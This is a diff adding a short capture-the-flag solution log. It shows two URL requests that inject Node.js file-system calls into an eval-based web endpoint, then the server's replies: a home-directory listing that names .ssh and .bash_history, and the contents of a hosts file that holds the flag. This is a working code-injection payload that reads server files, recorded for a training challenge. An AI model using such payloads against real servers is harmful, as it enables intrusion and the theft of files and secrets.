@@ -1,0 +1,13 @@
+http://c549ea2d8b7e.ngrok.io/?text=require('fs').readdirSync('.').toString()
+	Welcome to the world .bash_history,.bash_logout,.bashrc,.cache,.gnupg,.local,.pm2,.profile,.ssh,Dockerfile,hosts,main.js,node_modules,package-lock.json
+
+http://c549ea2d8b7e.ngrok.io/?text=require('fs').readFileSync('hosts').toString()
+	Welcome to the world 127.0.0.1	localhost
+	::1	localhost ip6-localhost ip6-loopback
+	fe00::0	ip6-localnet
+	ff00::0	ip6-mcastprefix
+	ff02::1	ip6-allnodes
+	ff02::2	ip6-allrouters
+	172.17.0.2	07e38cb70e8f
+
+	# so you found out even if I hid it in not-so common places. one stupid function and it made all my secrets public. shaktictf{eval_1s_n0t_safe_f0r_reputation}
